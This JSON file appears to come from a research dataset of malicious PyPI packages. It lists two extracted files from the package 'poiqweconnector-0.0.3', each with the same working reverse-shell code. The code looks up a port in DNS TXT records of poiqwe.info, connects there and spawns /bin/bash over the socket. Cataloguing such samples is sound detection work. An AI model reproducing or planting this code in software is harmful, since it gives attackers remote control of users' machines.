[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/poiqweconnector-0.0.3/poiqweconnector-0.0.3/src/poiqwe-connector/__init__.py",
    "malicious_code": "import socket\nimport os\nimport pty\nimport time\nimport dns.resolver\n\ndef connect():\n\tport = None\n\twhile port == None:\n\t\tanswers = dns.resolver.resolve('poiqwe.info', 'TXT')\n\t\tfor answer in answers:\n\t\t\tTXT = str(answer)\n\t\t\tif TXT[1:5] == \"port\":\n\t\t\t\tport = TXT[6:-1]\n\t\t\ttime.sleep(1)\n\n\tport = int(port)\n\ttarget = 'poiqwe.info'\n\ttry:\n\t\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\t\ts.settimeout(10)\n\t\ts.connect((target,port))\n\t\ts.settimeout(None)\n\t\tos.dup2(s.fileno(),0)\n\t\tos.dup2(s.fileno(),1)\n\t\tos.dup2(s.fileno(),2)\n\t\tpty.spawn(\"/bin/bash\")\n\t\ttime.sleep(1)\n\texcept Exception as e:\n\t\texit(False)\n\n\texit(True)\n\nif __name__ == '__main__':\n\tconnect()"
  },
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/poiqweconnector-0.0.3/poiqweconnector-0.0.3/src/poiqwe-connector/main.py",
    "malicious_code": "import socket\nimport os\nimport pty\nimport time\nimport dns.resolver\n\ndef connect():\n\tport = None\n\twhile port == None:\n\t\tanswers = dns.resolver.resolve('poiqwe.info', 'TXT')\n\t\tfor answer in answers:\n\t\t\tTXT = str(answer)\n\t\t\tif TXT[1:5] == \"port\":\n\t\t\t\tport = TXT[6:-1]\n\t\t\ttime.sleep(1)\n\n\tport = int(port)\n\ttarget = 'poiqwe.info'\n\ttry:\n\t\ts = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n\t\ts.settimeout(10)\n\t\ts.connect((target,port))\n\t\ts.settimeout(None)\n\t\tos.dup2(s.fileno(),0)\n\t\tos.dup2(s.fileno(),1)\n\t\tos.dup2(s.fileno(),2)\n\t\tpty.spawn(\"/bin/bash\")\n\t\ttime.sleep(1)\n\texcept Exception as e:\n\t\texit(False)\n\n\texit(True)\n\nif __name__ == '__main__':\n\tconnect()"
  }
]